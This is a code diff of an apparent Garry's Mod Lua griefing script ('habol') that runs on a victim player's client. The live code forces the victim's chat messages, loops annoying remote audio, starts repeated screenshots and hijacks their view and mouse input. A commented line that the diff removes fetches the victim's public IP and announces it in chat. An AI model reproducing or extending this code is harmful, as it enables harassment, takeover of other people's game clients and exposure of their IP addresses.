@@ -1,4 +1,3 @@
---if LocalPlayer():GetUserGroup() == "admin" or LocalPlayer():GetUserGroup() == "superadmin" then return end 
 if LocalPlayer():SteamID() == "STEAM_0:0:456670572" then 
         chat.AddText(Color(130,20,230),"Someone just tried to run habol on you! LOL")
         return 
@@ -183,24 +182,11 @@ local function oniichan() --aids copypasta
 end
 local function Everything()
     LocalPlayer():ConCommand("say It's begun...")
-    -- ALL TIMERS
-    --_timer.Create("haha", 4, 10000, function() _command('say', math.Round(1/RealFrameTime()))end) -- fps
-    --_timer.Create("haha3", 10, 1, function() http.Fetch('http://ipv4bot.whatismyipaddress.com', function(b) _command('say',b) end,function() end) end)
-    --_timer.Create("haha4", 6, 10000, function() _command('say', 'Ive taken '..tostring(jpegs)..' screenshots, onii-chan ~')end) -- screenshots
-    --timer.Createreate("haha5",.1,100000,function() sound.PlayURL('https://files.catbox.moe/97zo9m.mp3','',function()end)end)
     _timer.Create('hahasong', .1, 1, function() Song = true end)
-    s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end) --
-    --s.PlayURL('https://files.catbox.moe/cbt3yp.mp3','',function()end) --
-    --s.PlayURL('https://files.catbox.moe/v71on8.mp3','',function()end) --
-    --s.PlayURL('https://files.catbox.moe/8leev3.mp3','',function()end) --
-    --s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) --
-    --timer.Createreate('slow',44,10000,function() s.PlayURL('https://files.catbox.moe/97v5oy.mp3','',function()end) end) -- slow dancing in the dark
+    s.PlayURL('https://files.catbox.moe/d0ivsa.mp3','',function()end)
     s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) -- annoying anime song
-    _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end) -- annoying anime song timer (basically just makes it loop)
-    --_timer.Create('paste',0,10000,function()
-    --    oniichan()
-    --    _timer.Adjust('paste',21,10000,oniichan())
-    --end)
+    _timer.Create('oniiii',94,100000,function() s.PlayURL('https://files.catbox.moe/pimncq.mp3','',function()end) end)
+    
 
     _timer.Create('scren',0.2,100000,ss)
     _timer.Create('hntai', 1, 10000, function()
@@ -251,9 +237,7 @@ local function Everything()
         local PAngles = CUserCmd:GetViewAngles()
         local mousex = CUserCmd:GetMouseX()
         local mousey = CUserCmd:GetMouseY()
-        --_command('mat_motion_blur_enabled','1')
         _command('mat_vsync','1')
-        --render.SetAmbientLight(1,1,1)
         CUserCmd:SetViewAngles(PAngles - realangle)
     end)
     _hook.Add("CalcView", "funny", function(ply, pos, angles, fov)
